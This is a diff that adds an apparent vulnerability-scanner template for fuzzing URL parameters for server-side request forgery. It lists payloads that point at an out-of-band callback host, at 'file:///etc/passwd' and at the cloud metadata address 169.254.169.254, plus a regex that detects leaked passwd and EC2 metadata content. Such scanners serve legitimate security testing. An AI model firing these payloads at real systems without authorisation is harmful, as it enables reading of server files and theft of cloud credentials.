@@ -1,0 +1,28 @@
+id: ssrf-params
+type: fuzz
+level: 1
+info:
+  name: params based ssrf
+  risk: Medium
+
+
+variables:
+  - name: File("params.txt")
+
+params:
+  - dest: "{{.oob}}"
+
+
+payloads:
+  - "http://{{.Domain}}.{{.dest}}/{{.URL}}"
+  - "https://{{.Domain}}.{{.dest}}/{{.URL}}"
+  - "file:///etc/passwd"
+  - "http://169.254.169.254/latest/meta-data"
+
+requests:
+  - generators:
+      - Query("{{.payload}}", "{{.name}}")
+
+    detections:
+      - >-
+        RegexSearch("ResBody", "(?m)<html>(<head></head>)?<body>[a-z0-9]+</body>|ami-id|ami-launch-index|root:[x*]:0:0:")
